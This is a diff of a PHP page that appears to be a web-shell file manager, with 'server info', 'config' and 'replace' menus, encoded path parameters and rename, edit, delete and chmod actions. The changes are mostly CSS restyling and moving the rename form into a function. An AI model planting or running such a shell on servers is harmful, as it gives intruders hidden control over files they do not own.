@@ -30,9 +30,8 @@ extract(start());
 
     }
     table {
-        width:80%;
+        width:100%;
         padding:15px;
-        border-radius:5px;
         background-color: #fff;
         box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
     }
@@ -51,17 +50,27 @@ extract(start());
         color: #000;
     }
     button {
+    	color: #000;
         outline: none;
         background: transparent;
         border-radius:3px;
-        padding:3px 7px;
         border:1px solid #bababa;
+        padding:3px 7px;
+    }
+    button.other {
+        border:none;
     }
     input[type=submit] {
     	border:1px solid #bababa;
         border-radius:5px;
         outline: none;
         padding:5px;
+    }
+    .header-action {
+    	padding:20px;
+    	font-size:25px;
+    	font-weight: bold;
+    	text-align: center;
     }
     textarea {
         border:1px solid #bababa;
@@ -80,33 +89,8 @@ extract(start());
         width:25px;
         height:25px;
     }
-    ul.breadcrumb {
-        padding: 10px 16px;
-        list-style: none;
-        background-color: #eee;
-        border-radius:5px;
-    }
-    ul.breadcrumb li {
-        display: inline;
-        font-size: 18px;
-    }
-    ul.breadcrumb li+li:before {
-        padding: 8px;
-        color: black;
-        content: "/\00a0";
-    }
-    ul.breadcrumb li a {
-        color: #0275d8;
-        text-decoration: none;
-    }
-    ul.breadcrumb li a:hover {
-        color: #01447e;
-        text-decoration: underline;
-    }
     div.nav {
     	width: 100%;
-    	background: #fff;
-    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
     	overflow: hidden;
     	position: fixed;
     }
@@ -114,10 +98,26 @@ extract(start());
     	margin-top:30px;
     	padding:20px;
     }
+    input[type=text] {
+    	border:1px solid #bababa;
+        border-radius:5px;
+        outline: none;
+        padding:5px;
+        width:39%;
+    }
+    .navbar-bottom {
+    	overflow: hidden;
+  		position: fixed;
+  		bottom: 0;
+  		background: #fff;
+    	border-top: 1px solid #ededed;
+        bottom: 0;
+        width: 100%;
+      }
     .navbar {
+    	border-bottom: 1px solid #ededed;
     	width: 80%;
         background: #fff;
-    	box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1),0 2px 4px -1px rgba(0, 0, 0, 0.06);
         position: fixed;
         top: 0;
         width: 100%;
@@ -126,14 +126,11 @@ extract(start());
       	overflow: hidden;
         float: left;
         display: block;
-        color: #eeeeee;
+        color: #000;
         text-align: center;
         padding: 15px 18px;
         text-decoration: none;
         font-size: 18px;
-      }
-      .navbar a:hover {
-        color: #ffffff;
       }
       .container {
         padding: 18px;
@@ -157,6 +154,11 @@ extract(start());
      		margin:0;
      		width:100%;
      	}
+     	input[type=submit],
+     	input[type=text] {
+     		width:100%;
+     		padding:5px;
+     	}
         .navbar.responsive {position: relative;}
         .navbar.responsive .icon {
             position: fixed;
@@ -166,8 +168,15 @@ extract(start());
         .size, .time, .perms {
         	display: none;
         }
+        button.other {
+        	border:none;
+        }
+        div.nav {
+        	
+        }
         button {
             padding:5px;
+            font-size:17px;
             margin:1;
         }
         .navbar.responsive a.cwd {
@@ -201,20 +210,18 @@ function myFunction() {
 <div class="nav">
 <form method="post">
 	<div class="navbar" id="myTopnav">
+		<a href="?" class="home">Home</a>
 		<a>
-			<button>Home</button>
+			<button class="other">server info</button>
 		</a>
 		<a>
-			<button>server info</button>
+			<button class="other">config</button>
 		</a>
 		<a>
-			<button>config</button>
+			<button class="other">create file</button>
 		</a>
 		<a>
-			<button>create file</button>
-		</a>
-		<a>
-			<button>replace</button>
+			<button class="other">replace</button>
 		</a>
 		<a href="javascript:void(0);" style="font-size:15px;color:#000;" class="icon" onclick="myFunction()">&#9776;</a>
 	</div>
@@ -231,6 +238,146 @@ function myFunction() {
         $result['currentpathen'] = (isset($_GET['x'])) ? $_GET['x'] : encrypt(getcwd(),'en');
     
         return $result;
+    }
+    function actionChangename($file, $type) {
+    	switch ($type) {
+    		case 'dir':
+    			?>
+    			<tr>
+    				<td colspan="3" class="header-action">
+    					CHANGE NAME
+    				</td>
+    			</tr>
+    			<tr>
+    				<td>
+    					<?= @$alert; ?>	
+    				</td>
+    			</tr>
+    			<tr>
+    				<td class="act">
+    					Filename
+    				</td>
+    				<td class="img"><center>:</center></td>
+    				<td>
+    					<?= w__($file, basename($file)) ?>
+    				</td>
+    			</tr>
+    			<tr>
+    				<td>
+                		Type
+            		</td>
+            		<td><center>:</center></td>
+            		<td>
+                		<?= filetype($file) ?>
+            		</td>
+            	</tr>
+            	<tr>
+            		<td>
+            			Last Modif
+            		</td>
+            		<td><center>:</center></td>
+            		<td>
+            			<?= ftime($file) ?>
+            		</td>
+            	</tr>
+            	<form method="post">
+            		<td colspan="3">
+            			<button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+                		<button onclick="window.location.href='?x=<?= encrypt($file, 'en') ?>'">open</button>
+                		<button name="action" value="delete">delete</button>
+                		<button name="action" value="rename" disabled>rename</button>
+                		<button name="action" value="chmod">chmod</button>
+                		<button>donwload</button>
+                	</td>
+                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+                </form>
+            </tr>
+            <form method="post">
+            	<tr>
+            		<td colspan="3">
+            			<input type="text" name="newname" value="<?= basename($file) ?>">
+            		</td>
+            	</tr>
+            	<tr>
+            		<td colspan="3">
+            			<input type="submit" name="submit">
+            			<input type="hidden" name="action" value="changename">
+            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+            		</td>
+            	</tr>
+            </form>
+            <?php
+    			break;
+    		
+    		case 'file':
+    			?>
+    			<tr>
+    				<td colspan="3" class="header-action">
+    					CHANGE NAME
+    				</td>
+    			</tr>
+    			<tr>
+    				<td>
+    					<?= @$alert; ?>	
+    				</td>
+    			</tr>
+    			<tr>
+    				<td class="act">
+    					Filename
+    				</td>
+    				<td class="img"><center>:</center></td>
+    				<td>
+    					<?= w__($file, basename($file)) ?>
+    				</td>
+    			</tr>
+    			<tr>
+    				<td>
+                		Size
+            		</td>
+            		<td><center>:</center></td>
+            		<td>
+                		<?= size($file) ?>
+            		</td>
+            	</tr>
+            	<tr>
+            		<td>
+            			Last Modif
+            		</td>
+            		<td><center>:</center></td>
+            		<td>
+            			<?= ftime($file) ?>
+            		</td>
+            	</tr>
+            	<form method="post">
+            		<td colspan="3">
+            			<button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
+                		<button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
+                		<button name="action" value="edit">edit</button>
+                		<button name="action" value="delete">delete</button>
+                		<button name="action" value="rename" disabled>rename</button>
+                		<button name="action" value="chmod">chmod</button>
+                		<button>donwload</button>
+                	</td>
+                	<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+                </form>
+            </tr>
+            <form method="post">
+            	<tr>
+            		<td colspan="3">
+            			<input type="text" name="newname" value="<?= basename($file) ?>">
+            		</td>
+            	</tr>
+            	<tr>
+            		<td colspan="3">
+            			<input type="submit" name="submit">
+            			<input type="hidden" name="action" value="changename">
+            			<input type="hidden" name="file" value="<?= encrypt($file, 'en') ?>">
+            		</td>
+            	</tr>
+            </form>
+            <?php
+            break;
+    	}
     }
     function getfiles($type) {
         global $currentpath;
@@ -356,7 +503,7 @@ function myFunction() {
 
 ?>
 <table align="center" class="table">
-<br><br><br><br>
+<br><br><br>
 <?php
 switch (@$_POST['action']) {
 	case 'changename':
@@ -367,74 +514,11 @@ switch (@$_POST['action']) {
 				$alert = 'failed';
 			}
 		}
-		?>
-		<tr>
-			<td colspan="3">
-				<center>
-					CHANGE NAME
-				</center>
-			</td>
-		</tr>
-		<tr>
-			<td>
-				<?= @$alert; ?>
-			</td>
-		</tr>
-		<tr>
-            <td class="act">
-                Filename
-            </td>
-            <td class="img"><center>:</center></td>
-            <td>
-                <?= w__($_POST['file'], basename($_POST['file'])) ?>
-            </td>
-        </tr>
-        <tr>
-            <td>
-                Size
-            </td>
-            <td><center>:</center></td>
-            <td>
-                <?= size($_POST['file']) ?>
-            </td>
-        </tr>
-        <tr>
-            <td>
-                Last Modif
-            </td>
-            <td><center>:</center></td>
-            <td>
-                <?= ftime($_POST['file']) ?>
-            </td>
-        </tr>
-        <form method="post">
-            <td colspan="3">
-                <button onclick="window.location.href='?x=<?= $currentpath ?>'">files</button>
-                <button onclick="window.location.href='<?= $FILEPATH ?>'">view</button>
-                <button name="action" value="edit">edit</button>
-                <button name="action" value="delete">delete</button>
-                <button name="action" value="rename" disabled>rename</button>
-                <button name="action" value="chmod">chmod</button>
-                <button>donwload</button>
-            </td>
-            <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
-        </form>
-        </tr>
-        <form method="post">
-            <tr>
-                <td colspan="3">
-                    <input type="text" name="newname" value="<?= basename($_POST['file']) ?>">
-                </td>
-            </tr>
-            <tr>
-                <td colspan="3">
-                    <input type="submit" name="submit">
-                    <input type="hidden" name="action" value="changename">
-                    <input type="hidden" name="file" value="<?= encrypt($_POST['file'], 'en') ?>">
-                </td>
-            </tr>
-        </form>
-		<?php
+		if (is_dir($_POST['file'])) {
+			actionChangename($_POST['file'], 'dir');
+		} elseif (is_file($_POST['file'])) {
+			actionChangename($_POST['file'], 'file');
+		}
 		exit();
 		break;
     case 'edit':
@@ -447,10 +531,8 @@ switch (@$_POST['action']) {
         }
         ?>
         <tr>
-            <td colspan="3">
-                <center>
-                    EDIT
-                </center>
+            <td colspan="3" class="header-action">
+                EDIT
             </td>
         </tr>
         <tr>
@@ -531,6 +613,9 @@ switch (@$_POST['action']) {
 foreach (getfiles("dir") as $key => $value) {
     ?>
     <tr>
+    	<td class="img">
+    		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
+    	</td>
         <td class="img">
             <img class="icon" src="https://image.flaticon.com/icons/svg/716/716784.svg">
         </td>
@@ -561,6 +646,9 @@ foreach (getfiles("dir") as $key => $value) {
 foreach (getfiles("file") as $key => $value) {
     ?>
     <tr>
+    	<td class="img">
+    		<input type="checkbox" name="data[]" value="<?= $value['fullname'] ?>">
+    	</td>
         <td class="img">
             <img class="icon" src="<?= getfileimg($value['name']) ?>">
         </td>
@@ -590,5 +678,12 @@ foreach (getfiles("file") as $key => $value) {
     <?php
 }
 ?>
+<div class="navbar-bottom">
+	<form method="post">
+		<select name="">
+			<option selected disabled>option</option>
+		</select>
+	</form>
+</div>
 </table>
 </div>
